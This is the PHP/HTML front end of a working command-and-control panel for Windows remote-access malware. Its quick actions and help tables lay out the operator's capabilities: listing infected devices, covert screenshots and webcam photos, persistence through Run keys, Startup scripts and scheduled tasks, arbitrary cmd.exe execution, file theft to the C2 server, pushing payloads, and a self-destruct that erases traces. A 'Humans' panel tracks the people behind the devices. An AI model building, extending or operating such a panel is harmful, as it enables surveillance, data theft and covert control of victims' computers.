<?php
declare(strict_types=1);
require_once __DIR__ . '/includes/config.php';

if (!isAuthenticated()) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_REQUEST['action'] ?? '') === 'login') {
        require_once __DIR__ . '/includes/router.php';
        routeRequest();
    }
    require_once __DIR__ . '/handlers/auth.php';
    renderLoginForm();
    exit;
}
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="csrf-token" content="<?= htmlspecialchars(getCsrfToken()) ?>">
<meta name="server-date" content="<?= now() ?>">
<meta name="server-time" content="<?= time() ?>">
<title>C2 Panel</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='80' font-size='80'>&#9670;</text></svg>">
<link rel="stylesheet" href="assets/panel.css?v=3">
</head>
<body>
<div class="top">
    <h1>&#9670; C2 <span>Panel</span></h1>
    <div class="st">
        <span><b class="g">&#9679;</b> <span id="s-act">0</span> act</span>
        <span><b class="r">&#9679;</b> <span id="s-dead">0</span> dead</span>
        <span><span id="s-tot">0</span> tot</span>
        <span style="color:var(--amber)"><span id="s-pend">0</span> pend</span>
        <span style="color:var(--cyan)"><span id="s-done">0</span> done</span>
        <span><button id="hm-tg" class="btn btn-xs btn-hm" onclick="toggleHumans()">&#128100; Humans</button></span>
        <span><button class="btn btn-xs btn-gh" onclick="logout()">&#128682; Logout</button></span>
    </div>
</div>

<div class="hf">
<div class="sb">
    <div class="sh">
        Devices <span style="font-weight:400;color:var(--text2)" id="bcnt">(0)</span>
        <input id="bf" placeholder="search name, ip, uuid..." oninput="filterB()">
    </div>
    <div class="items" id="blist"></div>
</div>

<div class="sb off" id="psb">
    <div class="sh">
        HUMANS <span style="font-weight:400;color:var(--text2)" id="pcnt">(0)</span>
        <span style="display:flex;gap:3px;margin-top:3px">
            <button class="btn btn-xs btn-g" onclick="personForm()" style="flex:1">&#10010; Add Human</button>
            <button class="btn btn-xs btn-gh" onclick="loadPersons()" title="Refresh">&#8635;</button>
        </span>
    </div>
    <div class="items" id="plist"></div>
</div>

<div class="rt">
    <div class="wc" id="wc">
        <div class="bg">&#9670;</div>
        Select a device
    </div>

    <div class="pn" id="bp">
        <div class="rw">
            <div class="cl">
                <div class="cd"><div class="ch">&#9679; Device Info</div>
                <div class="cb"><div class="ig" id="binfo"></div></div></div>
            </div>
            <div class="cl">
                <div class="cd"><div class="ch">&#9889; Quick Actions</div>
                <div class="cb">
                    <div class="qb">
                        <button class="btn btn-xs btn-g" onclick="qc('ping')">&#10003; ping</button>
                        <button class="btn btn-xs btn-gh" onclick="qc('pwd')">pwd</button>
                        <button class="btn btn-xs btn-b" onclick="qc('screenshot')">&#128247; screenshot</button>
                        <button class="btn btn-xs btn-b" onclick="qc('camera')">&#128248; cam</button>
                        <button class="btn btn-xs btn-gh" onclick="qc('persist')">persist</button>
                        <button class="btn btn-xs btn-gh" onclick="qc('download')">&#11015; dl</button>
                        <button class="btn btn-xs btn-r" onclick="if(confirm('Kill beacon process? It will respawn on reboot if persisted.'))qc('die')">&#9760; kill</button>
                        <button class="btn btn-xs btn-r" style="background:#600;border-color:#900" onclick="if(confirm('SELF-DESTRUCT: Remove ALL persistence, delete all traces, and kill?'))qc('selfdestruct')">&#128128; self-destruct</button>
                        <button class="btn btn-xs btn-b" onclick="fmToggle()">&#128193; FM</button>
                        <button class="btn btn-xs btn-gh" onclick="dfToggle()">&#128451; DF</button>
                        <button class="btn btn-xs btn-gh" onclick="helpToggle()">&#10067; Help</button>
                    </div>
                </div></div>
            </div>
        </div>

        <div class="cd"><div class="ch">&#128221; Notes</div>
        <div class="cb">
            <textarea class="nt" id="nt-in" placeholder="Notes about this device..."></textarea>
            <div class="nt-ct">
                <button class="btn btn-xs btn-g" onclick="saveNotes()">Save</button>
                <span id="nt-st" style="font-size:10px;color:var(--text2);margin-left:4px"></span>
            </div>
        </div></div>

        <div class="cd" id="fm-card">
            <div class="ch">&#128193; Beacon File Browser <span id="fm-nm" style="font-weight:400;color:var(--text2)"></span> <button class="btn btn-xs btn-gh" onclick="fmToggle()" style="margin-left:auto">&#10005;</button></div>
            <div class="cb fm-cb">
                <div class="fm-pb" id="fm-pb"><button class="btn btn-xs btn-g" onclick="fmGo()">&#10148;</button></div>
                <div id="fm-body"><div class="fm-nf">Click &#128193; FM in Quick Actions to open.</div></div>
            </div>
        </div>
        <div class="cd" id="df-card">
            <div class="ch">&#128451; Device Files <span id="df-nm" style="font-weight:400;color:var(--text2)"></span> <button class="btn btn-xs btn-gh" onclick="dfToggle()" style="margin-left:auto">&#10005;</button></div>
            <div class="cb fm-cb">
                <div id="df-body"><div class="fm-nf">Click &#128451; DF in Quick Actions to open.</div></div>
            </div>
        </div>
        <div class="cd" id="help-card" style="display:none">
            <div class="ch">&#10067; Help &amp; Commands <button class="btn btn-xs btn-gh" onclick="helpToggle()" style="margin-left:auto">&#10005;</button></div>
            <div class="cb" style="max-height:400px;overflow-y:auto;font-size:11px;line-height:1.6;color:var(--text)">
                <div style="color:var(--cyan);font-weight:600;margin-bottom:6px">QUICK ACTIONS</div>
                <table style="width:100%;border-collapse:collapse">
                <tr><td style="padding:2px 8px;color:var(--green);white-space:nowrap">&#128247; screenshot</td><td>Capture full screen (DPI-aware, multi-monitor). Saved to Device Files.</td></tr>
                <tr><td style="padding:2px 8px;color:var(--green);white-space:nowrap">&#128248; cam</td><td>Capture webcam photo (VFW). Saved to Device Files.</td></tr>
                <tr><td style="padding:2px 8px;color:var(--green);white-space:nowrap">persist</td><td>Install persistence: Registry Run key + Startup .vbs + Scheduled Task (admin) + copied exe + run key (HKLM if admin).</td></tr>
                <tr><td style="padding:2px 8px;color:var(--green);white-space:nowrap">&#11015; dl</td><td>Download file from C2 to target (push).</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">&#9760; kill</td><td>Kill beacon process. Will respawn on reboot if persisted.</td></tr>
                <tr><td style="padding:2px 8px;color:#f44;white-space:nowrap">&#128128; self-destruct</td><td>Remove ALL persistence (registry, tasks, VBS, exe), delete UUID file, kill process. Full cleanup.</td></tr>
                <tr><td style="padding:2px 8px;color:var(--green);white-space:nowrap">&#128193; FM</td><td>File Manager: browse drives, directories, preview files, upload/download, delete.</td></tr>
                <tr><td style="padding:2px 8px;color:var(--green);white-space:nowrap">&#128451; DF</td><td>Device Files: view screenshots, camera shots, pulled files, notes.</td></tr>
                </table>

                <div style="color:var(--cyan);font-weight:600;margin:10px 0 6px">TERMINAL COMMANDS</div>
                <table style="width:100%;border-collapse:collapse">
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">shell &lt;cmd&gt;</td><td>Run any Windows command (shell is optional, everything goes through cmd.exe).</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">ps</td><td>List running processes (tasklist /v).</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">kill &lt;pid&gt;</td><td>Kill a process by PID (taskkill /PID /F).</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">drives</td><td>List all disk partitions with type and size.</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">browse &lt;path&gt;</td><td>List directory contents. Use /C:/path format.</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">pull &lt;path&gt;</td><td>Upload file from target to C2 server. Use /C:/path format.</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">read &lt;path&gt;</td><td>Read file contents (text or base64 for binary, max 10MB).</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">push &lt;file_id&gt; &lt;path&gt;</td><td>Download file from C2 to target.</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">delete &lt;path&gt;</td><td>Delete file or directory.</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">screenshot</td><td>Capture screen (same as &#128247; button).</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">camera / cam</td><td>Capture webcam (same as &#128248; button).</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">persist</td><td>Install persistence (same as persist button).</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">die / killself</td><td>Kill beacon process instantly (no cleanup).</td></tr>
                <tr><td style="padding:2px 8px;color:var(--amber);white-space:nowrap">selfdestruct</td><td>Full cleanup + kill (same as &#128128; button).</td></tr>
                </table>

                <div style="color:var(--cyan);font-weight:600;margin:10px 0 6px">FILE MANAGER</div>
                <div style="padding:0 8px">
                <b>Root /</b> shows all drives. Click a drive to browse its contents.<br>
                <b>&#128193; Get Selected</b> pulls checked files to C2 server.<br>
                <b>Push to Target</b> opens a dialog to pick a file from C2 and send it to the target.<br>
                <b>Info</b> shows file size, type, permissions, and modified date.<br>
                <b>Del</b> deletes the file (with confirmation).
                </div>

                <div style="color:var(--cyan);font-weight:600;margin:10px 0 6px">DEVICE FILES (DF)</div>
                <div style="padding:0 8px">
                Shows all files pulled from the target, screenshots, and camera shots.<br>
                <b>Open</b> a folder to see its files. <b>View</b> images inline. <b>DL</b> downloads to your machine.
                </div>
            </div>
        </div>
        <div class="rw" style="margin-top:12px">
            <div class="cl">
                <div class="cd"><div class="ch">&#128230; C2 Storage <span style="font-weight:400;color:var(--text2)">(pulled from target &middot; push from here)</span></div>
                <div class="cb" id="bfs"><div style="color:var(--text2);font-size:11px">No files.</div></div></div>
            </div>
            <div class="cl">
                <div class="cd"><div class="ch">&#128247; Media <span id="mcn" style="font-weight:400;color:var(--text2)"></span></div>
                <div class="cb" id="bme"></div></div>
            </div>
        </div>
    </div>
    </div>

    <div class="tc" id="tc">
        <div class="th">&#9001; Terminal <span class="th-n" id="th-n">-</span> <button class="btn btn-xs btn-gh" onclick="clearTerminal()" style="margin-left:auto" title="Clear terminal">&#9003;</button> <button class="btn btn-xs btn-r" onclick="cancelTask()" title="Cancel last pending task">&#9632; Stop</button></div>
        <div class="to" id="tout"><div class="l s">Select a device.</div></div>
        <div class="ti">
            <input id="tin" placeholder="whoami, ls, screenshot..." onkeydown="tk(event)">
            <button class="btn btn-g" onclick="dc()">&#10148;</button>
        </div>
    </div>
</div>

<div class="modal" id="mim" onclick="if(event.target===this)this.classList.remove('on')"><div class="modal-c"><img id="mim-s"></div></div>
<div class="modal" id="pm" onclick="if(event.target===this)this.classList.remove('on')"><div class="modal-c" style="max-width:500px;width:90vw;padding:0" id="pm-c"></div></div>
<div class="toast" id="toast"></div>

<script src="assets/panel.js?v=7"></script>
</body>
</html>



